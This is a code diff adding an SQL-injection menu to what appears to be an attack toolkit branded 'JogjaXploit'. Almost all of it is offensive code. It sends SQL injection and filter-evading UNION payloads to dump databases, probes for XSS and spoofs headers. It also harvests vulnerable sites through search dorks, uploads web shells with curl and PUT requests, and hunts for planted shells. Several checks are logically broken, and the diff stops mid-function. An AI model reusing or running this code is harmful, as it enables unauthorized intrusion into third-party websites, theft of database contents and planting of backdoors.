@@ -52,6 +52,7 @@ import threading, socket, random, http.client, scapy.all
 from scapy.all import IP, TCP, sr1, ARP, Ether, srp
 import struct, string
 from scapy.all import *
+from urllib.parse import urljoin
 
 global count
 global attack
@@ -100,13 +101,507 @@ if os.name == 'posix':  # Untuk sistem seperti Linux atau macOS
 elif os.name == 'nt':   # Untuk sistem Windows
     os.system('cls')
 red = '\033[1;91m'
-white = '\033[37m'
+white = '\033[0m'
 green = '\033[1;32m'
 yellow = '\033[1;33m'
 blue = '\033[1;34m'
 red_t = '\033[0;31;40m'
 gray = '\033[1;37;40m'
+gold = '\033[0;33m'
+def sqlite():
+    if os.name == 'posix':
+        os.system('clear')
+    elif os.name == 'nt':
+        os.system('cls')
+    pass
+    path = os.path.expanduser("~")
+    user_name = os.path.split(path)[-1]
+    logo = f"""{gold}
+    +--------------------------------------+
+    |                                      |
+    |           {green}WELCOME {red}{user_name}!{gold}         |
+    |                                      |
+    +--------------------------------------+
+                    {white}SQLite V1              
+    {gold}+----------{yellow}[{green}~{yellow}] {red_t}SQLite Menu {yellow}[{green}~{yellow}]{gold}---------+
+    {gold}| [{green}01{gold}] {yellow}Single site injection{gold}           |
+    {gold}| [{green}02{gold}] {yellow}Dork vuln site{gold}                  |
+    {gold}| [{green}03{gold}] {yellow}Dork + Auto Inject{gold}              |
+    {gold}| [{green}04{gold}] {yellow}Shell Uploader{gold}                  |
+    {gold}| [{green}05{gold}] {yellow}Web Crawler{gold}                     |
+    {gold}| [{green}06{gold}] {yellow}Shell Finder V2{gold}                 |
+    {gold}| [{green}07{gold}] {yellow}None{gold}                            |
+    {gold}| [{green}08{gold}] {yellow}None{gold}                            |
+    {gold}| [{green}09{gold}] {yellow}None{gold}                            |
+    {gold}| [{green}10{gold}] {yellow}None{gold}                            |
+    {gold}| [{green}11{gold}] {yellow}None{gold}                            |
+    {gold}| [{green}12{gold}] {yellow}None{gold}                            |
+    {gold}| [{green}13{gold}] {yellow}None{gold}                            |
+    {gold}| [{green}14{gold}] {yellow}None{gold}                            |
+    {gold}+--------------------------------------+
+    """
+    try:
+        os.mkdir('sqlite')
+    except:
+        pass
+    def start_savelog(target, uri, value):
+        target_directory = 'sqlite'
+        file_name = 'Injected_Sites.txt'
 
+        path = os.path.join(target_directory, file_name)
+        with open(path, 'a') as file:
+            try:
+                logs = f'Sites : {target}\n'
+                logs += f'Injected Payload [Order By]: {uri}\n'
+                logs += f'Injected Columns : {value}\n\n'
+                file.write(str(logs))
+                file.close()
+            except PermissionError:
+                print("Permission Error Detected, If u are using kali linux or else, please use root with typing 'sudo su' ! ")
+            except:
+                pass
+    print(logo)
+    choi = input(yellow + f"Sqlite@Choices ~{white}$ ")
+    def singleinject():
+        byps1 = "' OR 1=1; --"
+        byps2 = "' OR 'a'='a'; --"
+        byps3 = "' OR 1=1# --"
+        byps4 = "' OR 'a'='a'# --"
+        byps5 = "' OR 1=1/*"
+        byps6 = "' OR 'a'='a'/*"
+        byps7 = "'-1' OR '1'='1'"
+        byps8 = "'-1' OR 'a'='a'"
+        byps9 = "' OR 1=1/*"
+        byps10 = "' OR 'a'='a'/*"
+        unibas = "'UNION SELECT column1, column2 FROM table_name'" #dump
+        ecode = "Warning: mysql_query|Warning: mysql_fetch_row|Warning: mysql_fetch_assoc|Warning: mysql_fetch_object|Warning: mysql_numrows|Warning: mysql_num_rows|Warning: mysql_fetch_array|Warning: pg_connect|Supplied argument is not a valid PostgreSQL result|PostgreSQL query failed: ERROR: parser: parse error|MySQL Error|MySQL ODBC|MySQL Driver|supplied argument is not a valid MySQL result resource|on MySQL result index|Oracle ODBC|Oracle Error|Oracle Driver|Oracle DB2|Microsoft JET Database Engine error|ADODB.Command|ADODB.Field error|Microsoft Access Driver|Microsoft VBScript runtime error|Microsoft VBScript compilation error|Microsoft OLE DB Provider for SQL Server error|OLE/DB provider returned message|OLE DB Provider for ODBC|ODBC SQL|ODBC DB2|ODBC Driver|ODBC Error|ODBC Microsoft Access|ODBC Oracle|JDBC SQL|JDBC Oracle|JDBC MySQL|JDBC error|JDBC Driver|Invision Power Board Database Error|DB2 ODBC|DB2 error|DB2 Driver|error in your SQL syntax|unexpected end of SQL command|invalid query|SQL command not properly ended|Error converting data type varchar to numeric|An illegal character has been found in the statement|Active Server Pages error|ASP.NET_SessionId|ASP.NET is configured to show verbose error messages|A syntax error has occurred|ORA-01756|Error Executing Database Query|Unclosed quotation mark|BOF or EOF|GetArray|FetchRow|Input string was not in a correct format|Warning: include|Warning: require_once|function.include|Disallowed Parent Path|function.require|Warning: main|Warning: session_start|Warning: getimagesize|Warning: mysql_result|Warning: pg_exec|Warning: array_merge|Warning: preg_match|Incorrect syntax near|ORA-00921: unexpected end of SQL command|Warning: ociexecute|Warning: ocifetchstatement|error ORA-"
+        lfi_path = '/etc/passwd'
+        order_by = 'SELECT * FROM orders ORDER BY 1, 2, 3, 4, 5, 6, 7, 8, 9, 10;'
+        target = str(input(f"{yellow}[{green}~{yellow}] {gold}Enter your target url [ Example : https://example.com/news.php?id=1 ] :{white} "))
+        tampers = input(f"{yellow}[{green}~{yellow}] {gold}Use Tamper ? Y/N :{white} ")
+        if (target.lower() == 'https://' or 'http://'):
+            target = target
+        else:
+            target = 'https://'+target
+        def dumps():
+            print("Start Dump..")
+        def start_orderby():
+            heads = {
+                f"User-Agent": f"{random.choice(user_agents)}",
+                f"Host": f"{target}",
+                f"Content-Length": "20",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Accept-Encoding": "gzip, deflate",
+                "Connection": "keep-alive",
+                "Cache-Control": "no-cache",
+                "Accept": "*/*",
+                "Content-Type": "text/html",
+                "Referer": "https://gtamper.co.me",
+                "X-Forwarded-For": "127.0.0.1",
+                "X-Custom-Header": "GTamper",
+            }
+            pass
+            c = int(0)
+            value = 0
+            for i in range(50):
+                c += 1
+                value += 1
+                time.sleep(0.5)
+                #' ORDER BY 1,2,3--+
+                t = f','.join(str(t) for t in range(1, value + 1))
+                onion = (f"' ORDER BY {t}--+")
+                print(f"{yellow}[{green}~{yellow}] {gold}Starting ORDER BY until 50.{yellow}", c, end='\r')
+                uri = target+onion
+                r = requests.get(uri, headers=heads)
+                if (r.text == 'known column' in r.text):
+                    print(f"{yellow}[{green} Injected! {yellow}] {gold} Site : {target} Injected!, Detected : Column {value}")
+                    print(f"{yellow}[{green} Injected! {yellow}] {gold} Payload : {uri}")
+                    start_savelog(target, uri, value)
+                else:
+                    continue
+        def start_injection_sql():
+            heads = {
+                f"User-Agent": f"{random.choice(user_agents)}",
+                f"Host": f"{target}",
+                f"Content-Length": "20",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Accept-Encoding": "gzip, deflate",
+                "Connection": "keep-alive",
+                "Cache-Control": "no-cache",
+                "Accept": "*/*",
+                "Content-Type": "text/html",
+                "Referer": "https://gtamper.co.me",
+                "X-Forwarded-For": "127.0.0.1",
+                "X-Custom-Header": "GTamper",
+            }
+            def xss():
+                xss = "'--+<h1>Touched By JogjaXploit</h1>"
+                print(f"{yellow}[{green}~{yellow}] {gold}Testing XSS{white}")
+                url = target+xss
+                req = requests.get(url, header=heads)
+                if ('Touched By JogjaXploit' in req.text):
+                    print(f"{yellow}[{green}~{yellow}] {gold}Target is VULN with XSS{white}")
+                else:
+                    print(f"{yellow}[ {red}CRITICAL {yellow}] {gold}Target is not VULN with XSS {white}")
+            def phase2():
+                ecode1 = "Forbidden"
+                value = 0
+                dumpz = '(select%20group_concat(0x3c6c693e,schema_name,0x3c6c693e)%20from%20information_schema.schemata)'
+                for i in range(50):
+                    value += 1
+                    t = f','.join(str(t) for t in range(1, value + 1))
+                    onion = (f"{t}")
+                    ott = onion
+                    bypass_dumps1 = f"'/**8**/and/**8**/mod(9,9)/**8**//*!50000union*//**8**//*!50000select*//**8**/{ott}"
+                    print(f"{yellow}[{green}~{yellow}] {gold}Starting dump target dbs until 50.. ", value, end='\r')
+                    yuhuh = target+bypass_dumps1
+                    if tampers.lower() == 'y':
+                        e = requests.get(yuhuh, headers=heads)
+                    elif tampers.lower() == 'n':
+                        e = requests.get(yuhuh)
+                    else:
+                        exit()
+                    if ("1" or "2" or "3" or "4" or "5" or "6" or "7" or "8" or "9" or "10" or "11" or "12" or "13" or "14" or "15" or "16" or "17" or "18" or "19" or "20" or "21" or "22" or "23" or "24" or "25" or "26" or "27" or "28" or "29" or "30" or "31" or "32" or "33" or "34" or "35" or "36" or "37" or "38" or "39" or "40" or "41" or "42" or "43" or "44" or "45" or "46" or "47" or "48" or "49" or "50" in e.text):
+                        print(f"{yellow}[{green}~{yellow}] {gold}Trying to dump database..{white}")
+                        dumps = bypass_dumps1.replace(f"{value}", dumpz)
+                        domp = target+dumps
+                        def inject():
+                            if tampers.lower() == 'y':
+                                e = requests.get(domp, headers=heads)
+                            elif tampers.lower() == 'n':
+                                e = requests.get(domp)
+                            if ecode1 in e.text:
+                                print(f"{yellow}[{red} CRITICAL {yellow}] {gold} 403 Forbidden")
+                                continue
+                            return e.text
+                        inject()
+                print("Finished")
+            byps = ["' OR 1=1; --", "' OR 'a'='a'; --", "' OR 1=1# --", "' OR 'a'='a'# --", "' OR 1=1/*", "' OR 'a'='a'/*", "'-1' OR '1'='1'", "'-1' OR 'a'='a'", "' OR 1=1/*", "' OR 'a'='a'/*"]
+            start_orderby()
+            phase2()
+            xss()
+            for method in byps:
+                url = target+method
+                print(yellow + f"\n{yellow}[{green}~{yellow}] {gold}Inject Process..{yellow}")
+                if tampers.lower() == 'n':
+                    req = requests.get(url)
+                elif tampers.lower() == 'y':
+                    req = requests.get(url, headers=heads)
+                else:
+                    print(red + "invalid option")
+                    exit()
+                if ("Warning: mysql_query" or "Warning: mysql_fetch_row" or "Warning: mysql_fetch_assoc" or "Warning: mysql_fetch_object" or "Warning: mysql_numrows" or "Warning: mysql_num_rows" or "Warning: mysql_fetch_array" or "Warning: pg_connect" or "Supplied argument is not a valid PostgreSQL result" or "PostgreSQL query failed: ERROR: parser: parse error" or "MySQL Error" or "MySQL ODBC" or "MySQL Driver" or "supplied argument is not a valid MySQL result resource" or "on MySQL result index" or "Oracle ODBC" or "Oracle Error" or "Oracle Driver" or "Oracle DB2" or "Microsoft JET Database Engine error" or "ADODB.Command" or "ADODB.Field error" or "Microsoft Access Driver" or "Microsoft VBScript runtime error" or "Microsoft VBScript compilation error" or "Microsoft OLE DB Provider for SQL Server error" or "OLE/DB provider returned message" or "OLE DB Provider for ODBC" or "ODBC SQL" or "ODBC DB2" or "ODBC Driver" or "ODBC Error" or "ODBC Microsoft Access" or "ODBC Oracle" or "JDBC SQL" or "JDBC Oracle" or "JDBC MySQL" or "JDBC error" or "JDBC Driver" or "Invision Power Board Database Error" or "DB2 ODBC" or "DB2 error" or "DB2 Driver" or "error in your SQL syntax" or "unexpected end of SQL command" or "invalid query" or "SQL command not properly ended" or "Error converting data type varchar to numeric" or "An illegal character has been found in the statement" or "Active Server Pages error" or "ASP.NET_SessionId" or "ASP.NET is configured to show verbose error messages" or "A syntax error has occurred" or "ORA-01756" or "Error Executing Database Query" or "Unclosed quotation mark" or "BOF or EOF" or "GetArray" or "FetchRow" or "Input string was not in a correct format" or "Warning: include" or "Warning: require_once" or "function.include" or "Disallowed Parent Path" or "function.require" or "Warning: main" or "Warning: session_start" or "Warning: getimagesize" or "Warning: mysql_result" or "Warning: pg_exec" or "Warning: array_merge" or "Warning: preg_match" or "Incorrect syntax near" or "ORA-00921: unexpected end of SQL command" or "Warning: ociexecute" or "Warning: ocifetchstatement" or "error ORA-" or "u have an error in your SQL syntax" in req.text):
+                    print(yellow + f"[{green}~{yellow}] {gold}Target is {green}vuln!{yellow}")
+                    print(yellow + f"Payload : {url}")
+                else:
+                    print(red + "Maybe target has no vuln.")
+        def testing():
+            heads = {
+                f"User-Agent": f"{random.choice(user_agents)}",
+                f"Host": f"{target}",
+                f"Content-Length": "20",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Accept-Encoding": "gzip, deflate",
+                "Connection": "keep-alive",
+                "Cache-Control": "no-cache",
+                "Accept": "*/*",
+                "Content-Type": "text/html",
+                "Referer": "https://gtamper.co.me",
+                "X-Forwarded-For": "127.0.0.1",
+                "X-Custom-Header": "GTamper",
+            }
+            payload = ["'", "'--+", "'or 1=1 1-- +", "' OR 1=1; --"]
+            print(yellow + f"[~] Testing vuln with a {red}coma..{yellow}")
+            for pay in payload:
+                def testingsql():
+                    if tampers.lower() == 'n':
+                        a = requests.get(target+pay).text
+                    elif tampers.lower() == 'y':
+                        a = requests.get(target+pay, headers=heads).text
+                    if ("Warning: mysql_query" or "Warning: mysql_fetch_row" or "Warning: mysql_fetch_assoc" or "Warning: mysql_fetch_object" or "Warning: mysql_numrows" or "Warning: mysql_num_rows" or "Warning: mysql_fetch_array" or "Warning: pg_connect" or "Supplied argument is not a valid PostgreSQL result" or "PostgreSQL query failed: ERROR: parser: parse error" or "MySQL Error" or "MySQL ODBC" or "MySQL Driver" or "supplied argument is not a valid MySQL result resource" or "on MySQL result index" or "Oracle ODBC" or "Oracle Error" or "Oracle Driver" or "Oracle DB2" or "Microsoft JET Database Engine error" or "ADODB.Command" or "ADODB.Field error" or "Microsoft Access Driver" or "Microsoft VBScript runtime error" or "Microsoft VBScript compilation error" or "Microsoft OLE DB Provider for SQL Server error" or "OLE/DB provider returned message" or "OLE DB Provider for ODBC" or "ODBC SQL" or "ODBC DB2" or "ODBC Driver" or "ODBC Error" or "ODBC Microsoft Access" or "ODBC Oracle" or "JDBC SQL" or "JDBC Oracle" or "JDBC MySQL" or "JDBC error" or "JDBC Driver" or "Invision Power Board Database Error" or "DB2 ODBC" or "DB2 error" or "DB2 Driver" or "error in your SQL syntax" or "unexpected end of SQL command" or "invalid query" or "SQL command not properly ended" or "Error converting data type varchar to numeric" or "An illegal character has been found in the statement" or "Active Server Pages error" or "ASP.NET_SessionId" or "ASP.NET is configured to show verbose error messages" or "A syntax error has occurred" or "ORA-01756" or "Error Executing Database Query" or "Unclosed quotation mark" or "BOF or EOF" or "GetArray" or "FetchRow" or "Input string was not in a correct format" or "Warning: include" or "Warning: require_once" or "function.include" or "Disallowed Parent Path" or "function.require" or "Warning: main" or "Warning: session_start" or "Warning: getimagesize" or "Warning: mysql_result" or "Warning: pg_exec" or "Warning: array_merge" or "Warning: preg_match" or "Incorrect syntax near" or "ORA-00921: unexpected end of SQL command" or "Warning: ociexecute" or "Warning: ocifetchstatement" or "error ORA-" or "u have an error in your SQL syntax" in a):
+                        print(f"{yellow}[{green}~{yellow}] {gold}Site : {target} is Vuln!{white}")
+                    else:
+                        print(f"{yellow}[{green}~{yellow}] {gold}Site : {red}{target}{yellow} maybe not vuln {white}")
+                        choicess = input("Do you want to continue ? Y/N : ")
+                        if choicess.lower() == 'y':
+                            start_injection_sql()
+                        else:
+                            exit()
+                    start_injection_sql()
+                testingsql()
+        testing()
+    def dorkninject(site):
+        byps1 = "' OR 1=1; --"
+        byps2 = "' OR 'a'='a'; --"
+        byps3 = "' OR 1=1# --"
+        byps4 = "' OR 'a'='a'# --"
+        byps5 = "' OR 1=1/*"
+        byps6 = "' OR 'a'='a'/*"
+        byps7 = "'-1' OR '1'='1'"
+        byps8 = "'-1' OR 'a'='a'"
+        byps9 = "' OR 1=1/*"
+        byps10 = "' OR 'a'='a'/*"
+        unibas = "'UNION SELECT column1, column2 FROM table_name'" #dump
+        ecode = "Warning: mysql_query|Warning: mysql_fetch_row|Warning: mysql_fetch_assoc|Warning: mysql_fetch_object|Warning: mysql_numrows|Warning: mysql_num_rows|Warning: mysql_fetch_array|Warning: pg_connect|Supplied argument is not a valid PostgreSQL result|PostgreSQL query failed: ERROR: parser: parse error|MySQL Error|MySQL ODBC|MySQL Driver|supplied argument is not a valid MySQL result resource|on MySQL result index|Oracle ODBC|Oracle Error|Oracle Driver|Oracle DB2|Microsoft JET Database Engine error|ADODB.Command|ADODB.Field error|Microsoft Access Driver|Microsoft VBScript runtime error|Microsoft VBScript compilation error|Microsoft OLE DB Provider for SQL Server error|OLE/DB provider returned message|OLE DB Provider for ODBC|ODBC SQL|ODBC DB2|ODBC Driver|ODBC Error|ODBC Microsoft Access|ODBC Oracle|JDBC SQL|JDBC Oracle|JDBC MySQL|JDBC error|JDBC Driver|Invision Power Board Database Error|DB2 ODBC|DB2 error|DB2 Driver|error in your SQL syntax|unexpected end of SQL command|invalid query|SQL command not properly ended|Error converting data type varchar to numeric|An illegal character has been found in the statement|Active Server Pages error|ASP.NET_SessionId|ASP.NET is configured to show verbose error messages|A syntax error has occurred|ORA-01756|Error Executing Database Query|Unclosed quotation mark|BOF or EOF|GetArray|FetchRow|Input string was not in a correct format|Warning: include|Warning: require_once|function.include|Disallowed Parent Path|function.require|Warning: main|Warning: session_start|Warning: getimagesize|Warning: mysql_result|Warning: pg_exec|Warning: array_merge|Warning: preg_match|Incorrect syntax near|ORA-00921: unexpected end of SQL command|Warning: ociexecute|Warning: ocifetchstatement|error ORA-"
+        lfi_path = '/etc/passwd'
+        order_by = 'SELECT * FROM orders ORDER BY 1, 2, 3, 4, 5, 6, 7, 8, 9, 10;'
+        target = site
+        tampers = 'y'
+        if (target.lower() == 'https://' or 'http://'):
+            target = target
+        else:
+            target = 'https://'+target
+        def dumps():
+            print("Start Dump..")
+        def start_orderby():
+            heads = {
+                f"User-Agent": f"{random.choice(user_agents)}",
+                f"Host": f"{target}",
+                f"Content-Length": "20",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Accept-Encoding": "gzip, deflate",
+                "Connection": "keep-alive",
+                "Cache-Control": "no-cache",
+                "Accept": "*/*",
+                "Content-Type": "text/html",
+                "Referer": "https://gtamper.co.me",
+                "X-Forwarded-For": "127.0.0.1",
+                "X-Custom-Header": "GTamper",
+            }
+            pass
+            c = int(0)
+            value = 0
+            for i in range(50):
+                c += 1
+                value += 1
+                time.sleep(0.5)
+                #' ORDER BY 1,2,3--+
+                t = f','.join(str(t) for t in range(1, value + 1))
+                onion = (f"' ORDER BY {t}--+")
+                print(f"{yellow}[{green}~{yellow}] {gold}Starting ORDER BY until 50.{yellow}", c, end='\r')
+                uri = target+onion
+                r = requests.get(uri, headers=heads)
+                if (r.text == 'known column' in r.text):
+                    print(f"{yellow}[{green} Injected! {yellow}] {gold} Site : {target} Injected!, Detected : Column {value}")
+                    print(f"{yellow}[{green} Injected! {yellow}] {gold} Payload : {uri}")
+                    start_savelog(target, uri, value)
+                else:
+                    continue
+        def start_injection_sql():
+            heads = {
+                f"User-Agent": f"{random.choice(user_agents)}",
+                f"Host": f"{target}",
+                f"Content-Length": "20",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Accept-Encoding": "gzip, deflate",
+                "Connection": "keep-alive",
+                "Cache-Control": "no-cache",
+                "Accept": "*/*",
+                "Content-Type": "text/html",
+                "Referer": "https://gtamper.co.me",
+                "X-Forwarded-For": "127.0.0.1",
+                "X-Custom-Header": "GTamper",
+            }
+            def xss():
+                xss = "'--+<h1>Touched By JogjaXploit</h1>"
+                print(f"{yellow}[{green}~{yellow}] {gold}Testing XSS{white}")
+                url = target+xss
+                req = requests.get(url, header=heads)
+                if ('Touched By JogjaXploit' in req.text):
+                    print(f"{yellow}[{green}~{yellow}] {gold}Target is VULN with XSS{white}")
+                else:
+                    print(f"{yellow}[ {red}CRITICAL {yellow}] {gold}Target is not VULN with XSS {white}")
+            def phase2():
+                ecode1 = "Forbidden"
+                value = 0
+                dumpz = '(select%20group_concat(0x3c6c693e,schema_name,0x3c6c693e)%20from%20information_schema.schemata)'
+                for i in range(50):
+                    value += 1
+                    t = f','.join(str(t) for t in range(1, value + 1))
+                    onion = (f"{t}")
+                    ott = onion
+                    bypass_dumps1 = f"'/**8**/and/**8**/mod(9,9)/**8**//*!50000union*//**8**//*!50000select*//**8**/{ott}"
+                    print(f"{yellow}[{green}~{yellow}] {gold}Starting dump target dbs until 50.. ", value, end='\r')
+                    yuhuh = target+bypass_dumps1
+                    if tampers.lower() == 'y':
+                        e = requests.get(yuhuh, headers=heads)
+                    elif tampers.lower() == 'n':
+                        e = requests.get(yuhuh)
+                    else:
+                        exit()
+                    if ("1" or "2" or "3" or "4" or "5" or "6" or "7" or "8" or "9" or "10" or "11" or "12" or "13" or "14" or "15" or "16" or "17" or "18" or "19" or "20" or "21" or "22" or "23" or "24" or "25" or "26" or "27" or "28" or "29" or "30" or "31" or "32" or "33" or "34" or "35" or "36" or "37" or "38" or "39" or "40" or "41" or "42" or "43" or "44" or "45" or "46" or "47" or "48" or "49" or "50" in e.text):
+                        print(f"{yellow}[{green}~{yellow}] {gold}Trying to dump database..{white}")
+                        dumps = bypass_dumps1.replace(f"{value}", dumpz)
+                        domp = target+dumps
+                        def inject():
+                            if tampers.lower() == 'y':
+                                e = requests.get(domp, headers=heads)
+                            elif tampers.lower() == 'n':
+                                e = requests.get(domp)
+                            if ecode1 in e.text:
+                                print(f"{yellow}[{red} CRITICAL {yellow}] {gold} 403 Forbidden")
+                                continue
+                            return e.text
+                        inject()
+                print("Finished")
+            byps = ["' OR 1=1; --", "' OR 'a'='a'; --", "' OR 1=1# --", "' OR 'a'='a'# --", "' OR 1=1/*", "' OR 'a'='a'/*", "'-1' OR '1'='1'", "'-1' OR 'a'='a'", "' OR 1=1/*", "' OR 'a'='a'/*"]
+            start_orderby()
+            phase2()
+            xss()
+            for method in byps:
+                url = target+method
+                print(yellow + f"\n{yellow}[{green}~{yellow}] {gold}Inject Process..{yellow}")
+                if tampers.lower() == 'n':
+                    req = requests.get(url)
+                elif tampers.lower() == 'y':
+                    req = requests.get(url, headers=heads)
+                else:
+                    print(red + "invalid option")
+                    exit()
+                if ("Warning: mysql_query" or "Warning: mysql_fetch_row" or "Warning: mysql_fetch_assoc" or "Warning: mysql_fetch_object" or "Warning: mysql_numrows" or "Warning: mysql_num_rows" or "Warning: mysql_fetch_array" or "Warning: pg_connect" or "Supplied argument is not a valid PostgreSQL result" or "PostgreSQL query failed: ERROR: parser: parse error" or "MySQL Error" or "MySQL ODBC" or "MySQL Driver" or "supplied argument is not a valid MySQL result resource" or "on MySQL result index" or "Oracle ODBC" or "Oracle Error" or "Oracle Driver" or "Oracle DB2" or "Microsoft JET Database Engine error" or "ADODB.Command" or "ADODB.Field error" or "Microsoft Access Driver" or "Microsoft VBScript runtime error" or "Microsoft VBScript compilation error" or "Microsoft OLE DB Provider for SQL Server error" or "OLE/DB provider returned message" or "OLE DB Provider for ODBC" or "ODBC SQL" or "ODBC DB2" or "ODBC Driver" or "ODBC Error" or "ODBC Microsoft Access" or "ODBC Oracle" or "JDBC SQL" or "JDBC Oracle" or "JDBC MySQL" or "JDBC error" or "JDBC Driver" or "Invision Power Board Database Error" or "DB2 ODBC" or "DB2 error" or "DB2 Driver" or "error in your SQL syntax" or "unexpected end of SQL command" or "invalid query" or "SQL command not properly ended" or "Error converting data type varchar to numeric" or "An illegal character has been found in the statement" or "Active Server Pages error" or "ASP.NET_SessionId" or "ASP.NET is configured to show verbose error messages" or "A syntax error has occurred" or "ORA-01756" or "Error Executing Database Query" or "Unclosed quotation mark" or "BOF or EOF" or "GetArray" or "FetchRow" or "Input string was not in a correct format" or "Warning: include" or "Warning: require_once" or "function.include" or "Disallowed Parent Path" or "function.require" or "Warning: main" or "Warning: session_start" or "Warning: getimagesize" or "Warning: mysql_result" or "Warning: pg_exec" or "Warning: array_merge" or "Warning: preg_match" or "Incorrect syntax near" or "ORA-00921: unexpected end of SQL command" or "Warning: ociexecute" or "Warning: ocifetchstatement" or "error ORA-" or "u have an error in your SQL syntax" in req.text):
+                    print(yellow + f"[{green}~{yellow}] {gold}Target is {green}vuln!{yellow}")
+                    print(yellow + f"Payload : {url}")
+                else:
+                    print(red + "Maybe target has no vuln.")
+        def testing():
+            heads = {
+                f"User-Agent": f"{random.choice(user_agents)}",
+                f"Host": f"{target}",
+                f"Content-Length": "20",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Accept-Encoding": "gzip, deflate",
+                "Connection": "keep-alive",
+                "Cache-Control": "no-cache",
+                "Accept": "*/*",
+                "Content-Type": "text/html",
+                "Referer": "https://gtamper.co.me",
+                "X-Forwarded-For": "127.0.0.1",
+                "X-Custom-Header": "GTamper",
+            }
+            payload = ["'", "'--+", "'or 1=1 1-- +", "' OR 1=1; --"]
+            print(yellow + f"[~] Testing vuln with a {red}coma..{yellow}")
+            for pay in payload:
+                def testingsql():
+                    if tampers.lower() == 'n':
+                        a = requests.get(target+pay).text
+                    elif tampers.lower() == 'y':
+                        a = requests.get(target+pay, headers=heads).text
+                    if ("Warning: mysql_query" or "Warning: mysql_fetch_row" or "Warning: mysql_fetch_assoc" or "Warning: mysql_fetch_object" or "Warning: mysql_numrows" or "Warning: mysql_num_rows" or "Warning: mysql_fetch_array" or "Warning: pg_connect" or "Supplied argument is not a valid PostgreSQL result" or "PostgreSQL query failed: ERROR: parser: parse error" or "MySQL Error" or "MySQL ODBC" or "MySQL Driver" or "supplied argument is not a valid MySQL result resource" or "on MySQL result index" or "Oracle ODBC" or "Oracle Error" or "Oracle Driver" or "Oracle DB2" or "Microsoft JET Database Engine error" or "ADODB.Command" or "ADODB.Field error" or "Microsoft Access Driver" or "Microsoft VBScript runtime error" or "Microsoft VBScript compilation error" or "Microsoft OLE DB Provider for SQL Server error" or "OLE/DB provider returned message" or "OLE DB Provider for ODBC" or "ODBC SQL" or "ODBC DB2" or "ODBC Driver" or "ODBC Error" or "ODBC Microsoft Access" or "ODBC Oracle" or "JDBC SQL" or "JDBC Oracle" or "JDBC MySQL" or "JDBC error" or "JDBC Driver" or "Invision Power Board Database Error" or "DB2 ODBC" or "DB2 error" or "DB2 Driver" or "error in your SQL syntax" or "unexpected end of SQL command" or "invalid query" or "SQL command not properly ended" or "Error converting data type varchar to numeric" or "An illegal character has been found in the statement" or "Active Server Pages error" or "ASP.NET_SessionId" or "ASP.NET is configured to show verbose error messages" or "A syntax error has occurred" or "ORA-01756" or "Error Executing Database Query" or "Unclosed quotation mark" or "BOF or EOF" or "GetArray" or "FetchRow" or "Input string was not in a correct format" or "Warning: include" or "Warning: require_once" or "function.include" or "Disallowed Parent Path" or "function.require" or "Warning: main" or "Warning: session_start" or "Warning: getimagesize" or "Warning: mysql_result" or "Warning: pg_exec" or "Warning: array_merge" or "Warning: preg_match" or "Incorrect syntax near" or "ORA-00921: unexpected end of SQL command" or "Warning: ociexecute" or "Warning: ocifetchstatement" or "error ORA-" or "u have an error in your SQL syntax" in a):
+                        print(f"{yellow}[{green}~{yellow}] {gold}Site : {target} is Vuln!{white}")
+                    else:
+                        print(f"{yellow}[{green}~{yellow}] {gold}Site : {red}{target}{yellow} maybe not vuln {white}")
+                        choicess = input("Do you want to continue ? Y/N : ")
+                        if choicess.lower() == 'y':
+                            start_injection_sql()
+                        else:
+                            exit()
+                    start_injection_sql()
+                testingsql()
+        testing()
+    if choi == '1':
+        singleinject()
+    elif choi == '2':
+        try:
+            target = str(input(f"{yellow}[{green}~{yellow}] {gold}Enter your dork :{white} \n"))
+            for i in search(target, num=int(1), pause=2, start=0, stop=0):
+                print(f"{yellow}[{green}~{yellow}] {gold}{i}")
+            print('Done.')
+        except:
+            print('Error')
+            exit()
+    elif choi == '3':
+        pass
+        target = str(input(f"{yellow}[{green}~{yellow}] {gold}Enter your dork :{white} \n"))
+        for i in search(target, num=int(1), pause=2, start=0, stop=0):
+            try:
+                print(f"{yellow}[{green}~{yellow}] {gold}{i}")
+            except:
+                continue
+        sites = i.split()
+        for site in sites:
+            dorkninject(site)
+        print('done')
+        exit()
+    elif choi == '4':
+        p = input("Your shell path (directory) : ")
+        t = input("Your target : ")
+        os.system(f'curl -T {p} {t}')
+        payload = {file: p}
+        requests.post(t, data=payload)
+        requests.put(t + "/" + p, data=p)
+        print('Done')
+    elif choi == '5':
+        def web_crawler(url):
+            try:
+                # Send a GET request to the URL
+                response = requests.get(url)
+
+                # Check if the request was successful (status code 200)
+                if response.status_code == 200:
+                    # Parse the HTML content of the webpage
+                    soup = BeautifulSoup(response.content, 'html.parser')
+
+                    # Get the base URL of the site
+                    base_url = response.url
+                    print(f"{yellow}[{green}~{yellow}] {gold}Site: {white}", base_url)
+
+                    # Extract all the links on the webpage
+                    links = soup.find_all('a', href=True)
+                    for link in links:
+                        absolute_url = urljoin(base_url, link['href'])
+                        if '?' in absolute_url:
+                            print(f"{yellow}[{green}~{yellow}]{gold} URI: {white}", absolute_url)
+
+                        elif absolute_url.endswith('/'):
+                            print(f"{yellow}[{green}~{yellow}] {gold}Crawled folder: {white}", absolute_url)
+                        ext = ['doc', 'docx', 'pdf', 'db', 'sql', 'xls', 'xlsx', 'docm', 'dotm', 'ppt', 'php']
+                        for i in ext:
+                            if absolute_url.endswith(i):
+                                print(f"{yellow}[{green}~{yellow}]{gold} Crawled file: {white}", absolute_url)
+
+                else:
+                    print(red + f"Failed to retrieve webpage. Status code:", response.status_code)
+
+            except Exception as e:
+                print(red + f"An error occurred:", str(e))
+
+        # Example usage
+        if __name__ == '__main__':
+            site = input(f"{yellow}[{green}~{yellow}] {gold} Your Target URL : {white}")
+            web_crawler(site)
+    elif choi == '6':
+        def search_shells(url):
+            try:
+                resp = requests.get(url)
+                if resp.status_code == 200:
+                    base_url = resp.url
+                    soup = BeautifulSoup(resp.content, 'html.parser')
+                    links = soup.find_all('a', href=True)
+                    for link in links:
+                        absolute_url = urljoin(base_url, link['href'])
+                        if c.lower() == 'y':
+                            print(f"Example, Shell Name : indoxploit.php,mini.php,shellv3.php,shell.php")
+                            s = input(f"{yellow}[{green}~{yellow}]{gold} Shell Name : {white}")
+                            se  = s.split(',')
+                            sh = se
+                        elif c.lower() == 'n':
